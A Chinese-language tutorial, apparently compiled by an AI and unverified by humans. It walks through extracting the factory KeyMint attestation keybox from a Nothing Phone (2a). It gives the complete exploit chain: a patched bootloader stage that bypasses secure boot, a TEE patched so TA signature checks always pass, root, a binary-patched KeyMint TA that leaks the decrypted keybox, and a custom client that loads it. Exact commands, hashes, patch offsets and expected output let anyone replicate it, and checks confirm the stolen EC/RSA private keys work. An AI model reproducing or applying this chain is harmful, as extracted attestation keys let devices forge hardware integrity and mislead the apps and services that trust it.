# Nothing 2a：详细复现教程（去敏完整版）

> **文档来源与复现说明：**本目录的整理、拆分、翻译、去敏和章节编排由 AI 阅读既有项目工程目录、原始文档、实践流水和产物清单后完成。本公开副本中的每条命令、每个补丁、每个镜像和每个结果都未逐项人工执行、独立复现或签字确认。本文中的“教程”“结果”“验收”表示来源材料中的记录、证据模型或 AI 整理结论，不等同于人工验证通过，也不保证可以脱离完整工程上下文直接操作。使用时应先把目标设备的完整目录交给 AI 阅读，生成前置条件、版本/哈希门禁、失效路线、缺失证据和待验证步骤，再由有授权的人工在隔离环境中逐项复核；任何 AI 生成的命令都不得直接执行。


> 这里保留原始教程中的操作顺序、命令、返回值、失败分支和验收条件。主机路径、序列号、私钥、Keybox 明文和 32 字节材料原文已替换；设备侧路径、协议字段、补丁偏移和文件哈希等复现所需信息保留。所有命令都用相对路径或变量，不依赖个人目录。

---

## 原始记录段 1 / Source section 1: 02_二次复现文档.md

# Keybox 提取二次复现文档

文档类型：教程（只针对传统 KeyMint factory Keybox，不包含 RKP 签发）

目标：让另一个 AI 或操作者从当前项目状态复现 KeyMint factory attestation keybox 提取，并知道哪些坑不要再踩。

推荐工作根目录：

```bash
ROOT="<PROJECT_ROOT>"
FINAL="$ROOT/最终结果/keybox提取"
```

## 0. 前提

设备应满足：

```text
Nothing Phone (2a) / Pacman / MT6886
Android 14 / U2.5-240114-2323
Bootloader unlocked
fenrir patched LK 已启动
tee-patched-A-only.img 已刷入当前 slot
Magisk root 可用
tee-1-1 running
keystore2 running
vendor.keymint-trustonic running
```

主机需要：

```text
adb
openssl
python3
Android NDK clang
```

原始使用的 NDK 路径：

```bash
NDK="<HOST_SDK>/ndk/25.2.9519653/toolchains/llvm/prebuilt/darwin-x86_64"
```

## 1. 设备健康检查

```bash
cd "$ROOT"

adb devices -l
adb shell 'for p in ro.product.model ro.product.device ro.hardware ro.build.display.id ro.build.version.release ro.boot.slot_suffix ro.boot.verifiedbootstate init.svc.tee-1-1 init.svc.keystore2 init.svc.vendor.keymint-trustonic; do echo "$p=$(getprop $p)"; done'
adb shell 'id; command -v su; su -c id'
adb shell 'service list | grep -Ei "keymint|provision|rkp|keystore"'
adb shell 'ps -A | grep -Ei "keymint|rkpd|keystore|tee"'
```

期望：

```text
adb device 在线
ro.product.device=Pacman
ro.hardware=mt6886
ro.boot.verifiedbootstate=orange
tee-1-1 / keystore2 / vendor.keymint-trustonic = running
su -c id -> uid=0(root)
```

如果 root 不通，后面的 persist 读取、direct client 和 tar pull 都会失败。

## 2. 检查输入文件

在原项目根目录检查：

```bash
cd "$ROOT"

ls -l \
  device_dump/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin \
  device_dump/persist/attest_keybox.so \
  device_dump/persist/attestation_ids.so \
  device_dump/vendor_lib64/libMcClient.so \
  analysis/patch_0706_dump.py \
  analysis/extract_keybox_plain.py \
  keymint_tee_client/kmtee_probe.c

shasum -a 256 \
  device_dump/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin \
  device_dump/persist/attest_keybox.so \
  device_dump/persist/attestation_ids.so
```

期望 hash：

```text
ad17a40a49cc0c812f78359a72d5d5c73b54eabac261f861db6d1f72b3b745b2  070600...4d.tlbin
64fa3546cb36ae14c0388ee7fa1d5619251b26521f21ede56970beea73386f69  attest_keybox.so
5c8a419d3110f38256c0146af5e25e6a5f21e56a3b7ecc70e35fbe2889095c74  attestation_ids.so
```

归档副本在：

```text
$FINAL/source_binaries/
```

## 3. 重新生成 patched TA

推荐直接在原项目根目录执行，因为脚本使用相对路径：

```bash
cd "$ROOT"
python3 analysis/patch_0706_dump.py
shasum -a 256 patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin
```

期望：

```text
92d66968007e462f1c56c7aaee4ca4d5deb4da8822ba396035001d72f67b1016
```

如果只有 `最终结果/keybox提取` 目录，也可以临时搭一个 scratch：

```bash
SCRATCH="/tmp/keybox_replay"
rm -rf "$SCRATCH"
mkdir -p "$SCRATCH/device_dump/vendor_app_mcRegistry" "$SCRATCH/analysis" "$SCRATCH/patched_ta"
cp "$FINAL/source_binaries/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin" "$SCRATCH/device_dump/vendor_app_mcRegistry/"
cp "$FINAL/scripts/analysis/patch_0706_dump.py" "$SCRATCH/analysis/"
cd "$SCRATCH"
python3 analysis/patch_0706_dump.py
shasum -a 256 patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin
```

注意：scratch 只用于重建 patched TA；后续设备运行仍需要设备上的 `/mnt/vendor/persist/attest_keybox.so` 和 `/mnt/vendor/persist/attestation_ids.so`。

## 4. 编译 direct client

```bash
cd "$ROOT"

"$NDK/bin/aarch64-linux-android33-clang" -Wall -Wextra -O2 \
  keymint_tee_client/kmtee_probe.c \
  -o keymint_tee_client/kmtee_probe \
  -Ldevice_dump/vendor_lib64 -lMcClient -Wl,-rpath,/vendor/lib64

file keymint_tee_client/kmtee_probe
"$NDK/bin/llvm-readelf" -d keymint_tee_client/kmtee_probe | grep -E 'NEEDED|RUNPATH'
```

期望：

```text
ELF 64-bit LSB pie executable, ARM aarch64
NEEDED libMcClient.so
RUNPATH [/vendor/lib64]
```

归档里已有编译产物：

```text
$FINAL/scripts/keymint_tee_client/kmtee_probe
```

## 5. 推送并运行 patched TA

```bash
cd "$ROOT"

adb push keymint_tee_client/kmtee_probe /data/local/tmp/kmtee_probe
adb push patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin /data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin

adb shell 'su -c "chmod 755 /data/local/tmp/kmtee_probe && LD_LIBRARY_PATH=/vendor/lib64:/system_ext/lib64 /data/local/tmp/kmtee_probe /data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin"'
```

成功输出应包含：

```text
tl_path=/data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin
tl=281651 keybox=8716 ids=892
mcOpenDevice ret=0x0
mcOpenTrustlet ret=0x0
[attest_keybox] mcMap ret=0x0
[attest_keybox] mcWait ret=0x0 tci_ret=0x0
[attestation_ids] mcMap ret=0x0
[attestation_ids] mcWait ret=0x0 tci_ret=0x0
close cmd ret=0x0 tci_ret=0x0
DONE rc1=0 rc2=0
```

如果 `mcOpenTrustlet` 失败，优先确认：

- patched TEE 是否已启动。
- 推送的是 patched TA，不是 stock TA。
- 设备上 `tee-1-1` 是否 running。
- `LD_LIBRARY_PATH` 是否包含 `/vendor/lib64`。

## 6. 拉回输出

```bash
cd "$ROOT"

rm -rf keymint_tee_client/out_patched
mkdir -p keymint_tee_client/out_patched
adb exec-out su -c 'cd /data/local/tmp/kmtee_out && tar -cf - .' | tar -C keymint_tee_client/out_patched -xf -

find keymint_tee_client/out_patched -maxdepth 1 -type f -print -exec shasum -a 256 {} \;
```

关键文件：

```text
keymint_tee_client/out_patched/attest_keybox_before.bin
keymint_tee_client/out_patched/attest_keybox_buf_after.bin
keymint_tee_client/out_patched/attest_keybox_tci.bin
keymint_tee_client/out_patched/attestation_ids_before.bin
keymint_tee_client/out_patched/attestation_ids_buf_after.bin
keymint_tee_client/out_patched/attestation_ids_tci.bin
keymint_tee_client/out_patched/close_tci.bin
```

验证 before/after 已不同：

```bash
cmp -l keymint_tee_client/out_patched/attest_keybox_before.bin keymint_tee_client/out_patched/attest_keybox_buf_after.bin | head
xxd -g1 -l 64 keymint_tee_client/out_patched/attest_keybox_buf_after.bin
```

明文前缀应类似：

```text
01 00 00 00 8a 00 00 00 30 81 87 02 01 00 30 13
```

归档成功样本：

```text
$FINAL/outputs/keymint_tee_client_out_patched/
```

## 7. 拆分明文 keybox

```bash
cd "$ROOT"
python3 analysis/extract_keybox_plain.py
```

脚本默认读取：

```text
keymint_tee_client/out_patched/attest_keybox_buf_after.bin
```

并输出到：

```text
extracted_keybox/
```

期望输出：

```text
version_or_keybox_number=1
ec_private_key.der len=138
ec_cert_count=3
rsa_private_key.der len=1794
rsa_cert_count=3
plaintext_len=8624
tail_unmodified_len=92
```

如果要从最终归档副本重新解析，可搭 scratch：

```bash
SCRATCH="/tmp/keybox_extract_replay"
rm -rf "$SCRATCH"
mkdir -p "$SCRATCH/keymint_tee_client/out_patched" "$SCRATCH/analysis"
cp "$FINAL/outputs/keymint_tee_client_out_patched/attest_keybox_buf_after.bin" "$SCRATCH/keymint_tee_client/out_patched/"
cp "$FINAL/scripts/analysis/extract_keybox_plain.py" "$SCRATCH/analysis/"
cd "$SCRATCH"
python3 analysis/extract_keybox_plain.py
find extracted_keybox -maxdepth 1 -type f | sort
```

## 8. 生成 PEM 和证书链

```bash
cd "$ROOT"

for alg in ec rsa; do
  openssl pkey -inform DER -in extracted_keybox/${alg}_private_key.der -out extracted_keybox/${alg}_private_key.pem
  for i in 0 1 2; do
    openssl x509 -inform DER -in extracted_keybox/${alg}_cert_${i}.der -out extracted_keybox/${alg}_cert_${i}.pem
  done
  cat extracted_keybox/${alg}_cert_0.pem extracted_keybox/${alg}_cert_1.pem extracted_keybox/${alg}_cert_2.pem > extracted_keybox/${alg}_cert_chain.pem
done
```

## 9. 验证私钥和证书

### 公钥匹配

```bash
cd "$ROOT"

for alg in ec rsa; do
  openssl pkey -in extracted_keybox/${alg}_private_key.pem -pubout -outform DER | shasum -a 256
  openssl x509 -inform DER -in extracted_keybox/${alg}_cert_0.der -pubkey -noout | openssl pkey -pubin -outform DER | shasum -a 256
done
```

期望：

```text
EC:  11c57706dc0ec55c912de361742c7b5527a404ce6ed8fd32be8b6facc8b81b90
RSA: f950a598e25c83a1f4025225b4100e47b2dc9078a7d3f2dd3606882f07f00a2f
```

### 证书链

```bash
openssl verify -CAfile extracted_keybox/ec_cert_2.pem  -untrusted extracted_keybox/ec_cert_1.pem  extracted_keybox/ec_cert_0.pem
openssl verify -CAfile extracted_keybox/rsa_cert_2.pem -untrusted extracted_keybox/rsa_cert_1.pem extracted_keybox/rsa_cert_0.pem
```

期望：

```text
extracted_keybox/ec_cert_0.pem: OK
extracted_keybox/rsa_cert_0.pem: OK
```

### 私钥签名验签

```bash
echo test-message > extracted_keybox/sign_test.txt

for alg in ec rsa; do
  openssl dgst -sha256 -sign extracted_keybox/${alg}_private_key.pem -out extracted_keybox/${alg}_sig.bin extracted_keybox/sign_test.txt
  openssl dgst -sha256 -verify <(openssl x509 -in extracted_keybox/${alg}_cert_0.pem -pubkey -noout) -signature extracted_keybox/${alg}_sig.bin extracted_keybox/sign_test.txt
done
```

期望：

```text
Verified OK
Verified OK
```

归档验证记录在：

```text
$FINAL/outputs/extracted_keybox/ec_chain_verify.txt
$FINAL/outputs/extracted_keybox/rsa_chain_verify.txt
$FINAL/outputs/extracted_keybox/ec_sign_verify.txt
$FINAL/outputs/extracted_keybox/rsa_sign_verify.txt
```

## 10. 常见坑和解决

```text
坑：把 Widevine keybox 当 KeyMint attestation keybox
解：走 AndroidKeyStore/KeyMint/HAL/070600...4d.tlbin，不走 WVCdm/e97c270e。

坑：把 0717...drbin 当主目标
解：真正处理 keybox 的是 0706000000000000000000000000004d.tlbin。

坑：混刷不同系统版本 TEE
解：本题用 U2.5 体系，保持 tee-patched-A-only.img。

坑：替换 /vendor/app/mcRegistry 系统 TA
解：本题不需要替换系统文件，用 mcOpenTrustlet 从 /data/local/tmp 加载 patched TA。

坑：没 patched TEE 就加载 modified TA
解：先确认 patched TEE 已启动，否则 Trustonic MCLF 签名校验会拦截。

坑：unpatched TA 成功返回但 buffer 没变化
解：这是预期；stock TA 只在 secure world 内部 parse，不回写明文。

坑：脚本相对路径不对
解：优先在 ROOT=<PROJECT_ROOT> 下执行；只用最终归档时按本文 scratch 方式搭目录。
```

## 11. 复现完成判据

复现完成后应存在：

```text
extracted_keybox/attestation_keybox_plain.bin
extracted_keybox/ec_private_key.pem
extracted_keybox/rsa_private_key.pem
extracted_keybox/ec_cert_chain.pem
extracted_keybox/rsa_cert_chain.pem
extracted_keybox/keybox.xml
```

并满足：

```text
EC/RSA private pub hash == cert0 pub hash
EC/RSA openssl verify OK
EC/RSA sign verify OK
```


---

## 原始记录段 2 / Source section 2: 傻瓜版_KeyMint_keybox_提取说明.md

# 傻瓜版：从漏洞到复现再到提取 KeyMint keybox，到底做了什么？

> 面向读者：会一点 Android 开发，知道 APK、Keystore、证书，但不熟悉 Linux、bootloader、TEE、刷机和逆向。
>
> 项目目录：`<PROJECT_ROOT>`

---

## 0. 先说最终结论

这个项目的目标是：

> 从 Nothing Phone (2a) 这台手机里，把 Android KeyMint / Keystore 硬件认证用的 factory attestation keybox 提取出来。

最终提取出来的东西包括：

```text
EC attestation 私钥
EC attestation 证书链
RSA attestation 私钥
RSA attestation 证书链
keybox.xml
```

最终文件在：

```text
<PROJECT_ROOT>/extracted_keybox/
```

其中最重要的是：

```text
extracted_keybox/ec_private_key.pem
extracted_keybox/rsa_private_key.pem
extracted_keybox/ec_cert_chain.pem
extracted_keybox/rsa_cert_chain.pem
extracted_keybox/keybox.xml
```

这个项目不是提取 Widevine keybox，也不是破解 DRM。

正确目标是：

```text
Android Keystore / KeyMint attestation keybox
```

---

## 1. 对 Android 开发来说，keybox 是什么？

你可以先把它理解成：

> 手机硬件里预置的一套“证明我是真设备”的私钥和证书。

Android App 里如果调用：

```java
KeyPairGenerator.getInstance("EC", "AndroidKeyStore")
.setAttestationChallenge(...)
.generateKeyPair()
```

系统会生成一个硬件密钥，并返回一条证书链。

这条证书链的意思大概是：

```text
这个新生成的 App key
  是由手机 TEE / KeyMint 认证过的
  这个 TEE / KeyMint 又有厂商或 Google 相关证书链背书
```

在这个项目里，提取的是中间用来签发 attestation 的 factory keybox，也就是 KeyMint 用来给 AndroidKeyStore 生成认证链的那套上层材料。

---

## 2. 这个项目里的几个核心概念

### 2.1 Normal World 和 Secure World

普通 Android 系统运行在 Normal World。

比如：

```text
App
system_server
keystore2
HAL
普通 native 程序
```

TEE 运行在 Secure World。

比如：

```text
Trustonic t-base
KeyMint TA
各种 trustlet
```

你可以简单理解：

```text
Normal World = 普通 Android 世界
Secure World = 机密安全世界
```

Normal World 不能随便读 Secure World 的内存。

所以 keybox 明文正常情况下只在 Secure World 里出现，普通 Android 读不到。

---

### 2.2 TEE 是什么？

TEE 是 Trusted Execution Environment，可信执行环境。

这台设备用的是：

```text
Trustonic Kinibi / t-base
```

它负责加载各种安全小程序，也就是 TA / trustlet。

---

### 2.3 TA 是什么？

TA 可以理解成 Secure World 里的“安全版 native service”。

普通 Android 里有：

```text
keystore2
KeyMint HAL
```

Secure World 里对应有：

```text
KeyMint TA
```

本项目真正目标 TA 是：

```text
/vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin
```

本地 dump 后在：

```text
<PROJECT_ROOT>/device_dump/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin
```

这个就是 Trustonic 的 KeyMint TA。

---

### 2.4 HAL 是什么？

Android App 不会直接调用 TEE。

正常路径是：

```text
Android App
  ↓
Android Keystore API
  ↓
keystore2
  ↓
KeyMint HAL
  ↓
Trustonic libMcClient.so
  ↓
KeyMint TA
```

本机 KeyMint HAL 文件是：

```text
/vendor/bin/hw/android.hardware.security.keymint@2.0-service.trustonic
```

本地 dump 在：

```text
<PROJECT_ROOT>/device_dump/vendor_bin_hw/android.hardware.security.keymint@2.0-service.trustonic
```

逆向 HAL 可以看到它会读取：

```text
/mnt/vendor/persist/attest_keybox.so
/mnt/vendor/persist/attestation_ids.so
/vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin
```

这说明 `070600...4d.tlbin` 就是处理 attestation keybox 的 TA。

---

## 3. 这次攻击链一句话说明

一句话：

> 先让手机允许加载修改过的 TEE / TA，然后修改 KeyMint TA，让它在解密 keybox 后把明文拷出来。

完整链路：

```text
解锁 Bootloader
  ↓
刷 patched LK
  ↓
启动链不再拦 modified TEE
  ↓
刷 patched tee.img
  ↓
Trustonic t-base 不再拦 modified TA
  ↓
获得 Magisk root
  ↓
读取设备上的 KeyMint TA 和 persist keybox blob
  ↓
patch KeyMint TA
  ↓
用 direct client 临时加载 patched TA
  ↓
让 patched TA 解密 attest_keybox.so
  ↓
patched TA 把明文 keybox 写回 Normal World buffer
  ↓
拉回 buffer
  ↓
拆出 EC/RSA 私钥和证书链
```

---

## 4. 到底刷了哪些东西？

真正必要刷入的东西只有三个。

| 目的 | 分区 | 刷入文件 | 作用 |
|---|---|---|---|
| 放开启动链 | `lk_a` | `pacman-fenrir-minimal.bin` | 让后续 modified TEE 能启动 |
| 放开 TA 签名校验 | `tee_a` | `tee-patched-A-only.img` | 让 modified KeyMint TA 能被 t-base 加载 |
| 获得 root | `init_boot_a` | `magisk_patched.img` | 读取 persist/vendor 文件，运行 native client |

对应项目文件：

```text
<PROJECT_ROOT>/pacman-fenrir-minimal.bin
<PROJECT_ROOT>/tee-patched-A-only.img
<PROJECT_ROOT>/magisk_patched.img
```

---

## 5. 哪些东西不要刷？

文档里踩过坑，所以这里很重要。

### 5.1 不要刷 `tee-patched.img`

这个是早期 A+B 补丁版本。

实测会导致启动问题。

正确使用：

```text
tee-patched-A-only.img
```

不要使用：

```text
tee-patched.img
```

---

### 5.2 不要把 U2.6 TEE 刷到 U2.5 系统

设备系统是：

```text
NOS U2.5-240114-2323
```

之前把 U2.6 的 `tee.img` 刷到 U2.5 系统后，设备进 recovery。

原因是：

```text
TEE 内部组件和系统/vendor 版本不匹配
```

所以 TEE 必须用 U2.5 系列基底。

最终使用的是：

```text
U2.5-231207 原厂 tee.img
```

然后只打 A-only patch。

---

### 5.3 不需要替换 `/vendor/app/mcRegistry` 里的系统 TA

最终方案没有替换系统 TA。

也就是说，没有直接把：

```text
/vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin
```

替换成 patched 版本。

原因后面会详细解释。

---

## 6. 第一层：fenrir / patched LK 是干嘛的？

### 6.1 Bootloader 和 LK 是什么？

手机启动大概是：

```text
BootROM
  ↓
Preloader
  ↓
LK / bl2_ext
  ↓
TEE
  ↓
Android kernel
  ↓
Android 系统
```

`LK` 可以理解成 Android 启动前的一个启动组件。

正常情况下，每一层都会校验下一层有没有被篡改。

比如：

```text
Preloader 校验 LK
LK 校验 TEE
TEE 校验 TA
```

这就是 secure boot chain，安全启动链。

---

### 6.2 fenrir 漏洞是什么？

文档总结的漏洞是：

```text
seccfg=unlock 时，Preloader 跳过 bl2_ext / LK 校验
```

也就是说，当 Bootloader 解锁后，某个本该被校验的启动组件没有被严格校验。

于是可以刷入 patched LK。

项目使用 fenrir 生成：

```text
pacman-fenrir-minimal.bin
```

这个补丁只改一个核心策略：

```text
不要强制后续镜像校验
```

刷入：

```text
lk_a
```

效果：

```text
后续 modified tee.img 可以正常启动
```

如果没有这一步，patched `tee.img` 会被启动链拦住。

---

## 7. 第二层：patched TEE 是干嘛的？

即使 patched TEE 可以启动，TEE 自己还会校验 TA。

KeyMint TA 是一个 MCLF 格式 trustlet。

正常情况下：

```text
Trustonic t-base 会检查 TA 签名
```

我们后面要加载自己修改过的 KeyMint TA。

修改过以后，签名肯定不对。

所以必须 patch t-base，让它不要拒绝 modified TA。

最终刷的是：

```text
tee_a = tee-patched-A-only.img
```

这个补丁的效果是：

```text
Trustonic t-base 的 verifySignature 恒返回成功
```

这样后面 direct client 才能加载：

```text
patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin
```

---

## 8. 第三层：Magisk root 是干嘛的？

root 的目的不是直接读 keybox 明文。

因为 keybox 明文不在普通文件里。

root 的作用是：

```text
1. 读取 /mnt/vendor/persist/attest_keybox.so
2. 读取 /mnt/vendor/persist/attestation_ids.so
3. 读取 /vendor/app/mcRegistry/070600...4d.tlbin
4. 把 native client 放到 /data/local/tmp 并执行
```

刷的是：

```text
init_boot_a = magisk_patched.img
```

刷完后验证：

```text
su -c id
```

能返回 root 就行。

---

## 9. 正确目标是 KeyMint，不是 Widevine

项目早期走过 Widevine 路线。

Widevine 相关文件类似：

```text
e97c270ea5c44c58bcd3384a2fa2539e.tabin
OEMCrypto
WVCdm
MediaDrm
```

但后来确认：

```text
Widevine keybox ≠ Android KeyMint attestation keybox
```

这次真正目标是：

```text
KeyMint TA: 0706000000000000000000000000004d.tlbin
Encrypted keybox: attest_keybox.so
Attestation ids: attestation_ids.so
```

所以最终路线完全转向 KeyMint。

---

## 10. `attest_keybox.so` 是什么？

文件位置：

```text
/mnt/vendor/persist/attest_keybox.so
```

本地 dump：

```text
<PROJECT_ROOT>/device_dump/persist/attest_keybox.so
```

它不是普通 `.so` 动态库。

在这里它更像是一个 persist 里的加密数据 blob。

它里面保存的是：

```text
factory attestation keybox 的加密形式
```

也就是说：

```text
磁盘上：加密 keybox
TEE 里：可以解密成明文 keybox
Normal World：正常拿不到明文
```

---

## 11. KeyMint TA 原本怎么处理 keybox？

通过逆向，文档里定位到 KeyMint TA 支持这些 TCI 命令：

```text
0x00050202: 加载/处理 attest_keybox.so
0x00050204: 加载/处理 attestation_ids.so
0x00050016: close
```

其中最关键的是：

```text
0x00050202
```

它的处理流程是：

```text
0x1e430
  ↓
读取 normal world 映射进来的 attest_keybox.so
  ↓
复制到 TA heap
  ↓
调用 0x1de70

0x1de70
  ↓
分配 plaintext buffer
  ↓
调用 0x22738 解密 secure object
  ↓
调用 0x1d9b8 解析 plaintext keybox
  ↓
释放 plaintext
```

重点是：

```text
0x22738 返回后，keybox 明文已经出现在 Secure World 内存里
```

但是原版 TA 不会把这个明文返回给 Android。

它只是自己 parse，然后保存到 TA 内部结构里，再释放临时明文。

---

## 12. patch KeyMint TA 的核心思路

原版流程：

```text
encrypted keybox
  ↓
TA 解密
  ↓
plaintext keybox 只在 Secure World 内部出现
  ↓
TA parse
  ↓
free
  ↓
Normal World 什么也拿不到
```

patched 流程：

```text
encrypted keybox
  ↓
TA 解密
  ↓
plaintext keybox 出现
  ↓
patch 代码把 plaintext copy 到 input heap
  ↓
handler 返回前再 copy 回 normal world mapped buffer
  ↓
Normal World 拿到明文
```

所以本项目没有破解加密算法。

真正做的是：

> 借 KeyMint TA 自己的解密能力，在明文生命周期里把结果复制出来。

---

## 13. patch 脚本是什么？

patch 脚本是：

```text
<PROJECT_ROOT>/analysis/patch_0706_dump.py
```

输入：

```text
device_dump/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin
```

输出：

```text
patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin
```

关键 patch 点：

```text
0x1df3c -> branch 0x411ac
0x1e4d4 -> branch 0x411cc
```

用更简单的话说：

```text
第一个 patch：在 keybox 明文刚解出来时，把它保存一下。
第二个 patch：在命令返回前，把保存的明文写回 Android 可读的 buffer。
```

---

## 14. direct client 是什么？

这是本项目最关键、也最容易不懂的地方。

### 14.1 普通系统路径

正常 AndroidKeyStore 认证路径是：

```text
Android App
  ↓
keystore2
  ↓
KeyMint HAL
  ↓
libMcClient.so
  ↓
系统原版 KeyMint TA
```

系统原版 TA 文件是：

```text
/vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin
```

---

### 14.2 如果替换系统 TA，会发生什么？

一种方案是直接把系统 TA 替换成 patched TA。

也就是替换：

```text
/vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin
```

但这样风险比较大：

```text
1. 要改 /vendor 或做 bind mount
2. 可能要停掉 keystore2 / KeyMint HAL
3. 如果 patched TA 崩溃，系统 KeyMint 会被影响
4. Android 其他功能可能出问题
5. 调试不方便
6. 回滚麻烦
```

所以最终没有这么做。

---

### 14.3 direct client 的意思

`direct client` 就是自己写一个 native 程序，直接调用 Trustonic 的 client API。

项目里的 direct client 是：

```text
<PROJECT_ROOT>/keymint_tee_client/kmtee_probe.c
```

它编译后是一个 Android arm64 ELF 程序：

```text
keymint_tee_client/kmtee_probe
```

它绕过：

```text
Android App
keystore2
KeyMint HAL
```

自己直接走：

```text
kmtee_probe
  ↓
libMcClient.so
  ↓
Trustonic TEE
  ↓
patched KeyMint TA
```

---

## 15. direct client 为什么能加载 patched TA？

因为 Trustonic 提供了接口：

```c
mcOpenTrustlet(...)
```

它允许 Normal World client 提供一个 trustlet 文件内容，让 TEE 加载。

正常情况下，TEE 会校验 trustlet 签名。

但是前面已经刷了：

```text
tee-patched-A-only.img
```

这个 patched TEE 已经让签名校验恒成功。

所以 direct client 可以加载这个文件：

```text
/data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin
```

而不是系统 `/vendor` 里的原版 TA。

这就是为什么不用替换系统 TA。

---

## 16. direct client 具体干了什么？

源码里主要做这些事：

```text
1. 读取 patched TA 文件
2. 读取 /mnt/vendor/persist/attest_keybox.so
3. 读取 /mnt/vendor/persist/attestation_ids.so
4. mcOpenDevice()
5. mcOpenTrustlet() 加载 patched TA
6. mcMap() 把 keybox buffer 映射给 TA
7. 写 TCI 命令 0x00050202
8. mcNotify() 通知 TA 执行
9. mcWaitNotification() 等 TA 完成
10. 保存 keybox buffer after
11. 对 attestation_ids.so 也发 0x00050204
12. close session
```

关键输出：

```text
keymint_tee_client/out_patched/attest_keybox_buf_after.bin
```

这个文件原本应该还是 encrypted blob。

但因为 patched TA 把明文写回来了，所以它变成了 keybox 明文开头：

```text
01 00 00 00 8a 00 00 00 30 81 87 ...
```

看到 `30 81 ...` 这种 DER 结构，就说明里面已经出现了 ASN.1 / DER 私钥或证书结构。

---

## 17. TCI 是什么？

TCI 可以理解成 Normal World 和 Secure World 之间的小纸条。

Normal World 写：

```text
我要执行哪个命令
输入 buffer 在哪里
输入 buffer 多长
```

Secure World 执行后写：

```text
执行结果
错误码
```

本项目里的 TCI 大小是：

```text
0x140
```

布局大概是：

```text
TCI[0x00:0x04] = command id
TCI[0x04:0x08] = TA return code
TCI[0x0c:0x14] = mcBulkMap_t {sVirtualAddr, sVirtualLen}
```

处理 `attest_keybox.so` 时写：

```text
TCI[0x00] = 0x00050202
TCI[0x0c] = mapped buffer 地址和长度
```

然后：

```text
mcNotify()
mcWaitNotification()
```

TA 执行完成后，direct client 再保存 buffer。

---

## 18. mcMap 是什么？

Normal World 的普通内存，Secure World 不能随便访问。

`mcMap()` 的作用是：

> 把 Normal World 的一段 buffer 映射给 Secure World，让 TA 可以读写。

在这个项目里：

```text
kmtee_probe 读取 attest_keybox.so 到普通内存
  ↓
mcMap() 把这块内存映射给 TA
  ↓
TA 读到 encrypted keybox
  ↓
patched TA 把 plaintext keybox 写回同一块 mapped buffer
  ↓
kmtee_probe 保存这块 buffer
```

这就是“把明文带回 Normal World”的关键。

---

## 19. 提取出的 buffer 怎么拆成 keybox？

提取后的 buffer 是：

```text
keymint_tee_client/out_patched/attest_keybox_buf_after.bin
```

拆分脚本：

```text
<PROJECT_ROOT>/analysis/extract_keybox_plain.py
```

它按这个格式解析：

```text
u32 version

EC 部分：
  u32 EC private key DER 长度
  EC private key DER
  u32 EC cert 数量
  cert 0 DER
  cert 1 DER
  cert 2 DER

RSA 部分：
  u32 RSA private key DER 长度
  RSA private key DER
  u32 RSA cert 数量
  cert 0 DER
  cert 1 DER
  cert 2 DER
```

解析结果：

```text
version_or_keybox_number=1
EC private key DER len=138
EC cert_count=3
RSA private key DER len=1794
RSA cert_count=3
plaintext_len=8624
tail_unmodified_len=92
```

最终输出到：

```text
extracted_keybox/
```

---

## 20. 怎么确认真的提取成功？

项目做了三类验证。

### 20.1 私钥和证书公钥匹配

验证 EC：

```text
EC private key 推导出的 public key
等于
EC cert_0 里的 public key
```

验证 RSA：

```text
RSA private key 推导出的 public key
等于
RSA cert_0 里的 public key
```

结果：

```text
EC private pub == EC cert0 pub
RSA private pub == RSA cert0 pub
```

---

### 20.2 证书链验证通过

验证：

```text
cert_0 -> cert_1 -> root
```

结果：

```text
extracted_keybox/ec_cert_0.pem: OK
extracted_keybox/rsa_cert_0.pem: OK
```

---

### 20.3 私钥真的能签名

项目用私钥签名测试消息，再用证书公钥验签。

结果：

```text
Verified OK
Verified OK
```

这说明不是假文件，也不是单纯格式像，而是真的可用私钥。

---

## 21. 和 AndroidKeyStore 实际输出怎么对应？

项目还写了一个 Android APK：

```text
<PROJECT_ROOT>/keymint_trigger/
```

它做的事是正常 Android 开发也熟悉的：

```java
KeyPairGenerator
AndroidKeyStore
setAttestationChallenge
getCertificateChain
```

输出在：

```text
keymint_trigger/out/
```

对照关系是：

```text
AndroidKeyStore 新生成 key 的 cert_0
  是新 key 的 leaf

extracted_keybox/ec_cert_0.der
  对应 AndroidKeyStore 输出链里的 ec_cert_1.der

extracted_keybox/ec_cert_1.der
  对应 AndroidKeyStore 输出链里的 ec_cert_2.der

extracted_keybox/ec_cert_2.der
  对应 AndroidKeyStore 输出链里的 ec_cert_3.der
```

RSA 同理。

这说明：

```text
提取出的 keybox 不是随机证书
而是 AndroidKeyStore 实际使用的 factory attestation chain 上层材料
```

---

## 22. RKP 是什么？和这次提取有什么关系？

RKP 是 Remote Key Provisioning，远程密钥置备。

简单理解：

```text
老路线：设备本地 factory keybox 做认证
新路线：Google 远程发临时 attestation key
```

这台设备确实支持 RKP：

```text
android.hardware.security.keymint.IRemotelyProvisionedComponent/default
remote_provisioning
com.android.rkpdapp
```

后续项目还 dump 了 RKPD 数据库：

```text
rkp_research/current_device_dump_20260815_150725/
```

发现：

```text
12 条 provisioned RKP keys
3 条已分配
9 条未分配
每条都有 216B opaque key_blob + public key + 4 张 RKP cert chain
12/12 证书链验证 OK
```

但是：

```text
这次主线已经完成的是 factory keybox 提取
RKP 私钥明文还没有完成提取
```

RKP DB 里的 `key_blob` 是 opaque wrapped blob，不是裸私钥。

要提取 RKP 私钥，还需要继续逆向 KeyMint unwrap / sign path。

---

## 23. 整个项目的“必要工作流”

如果只看必要动作，流程是：

```text
1. 确认设备型号和系统版本
2. 解锁 Bootloader
3. 刷 lk_a = pacman-fenrir-minimal.bin
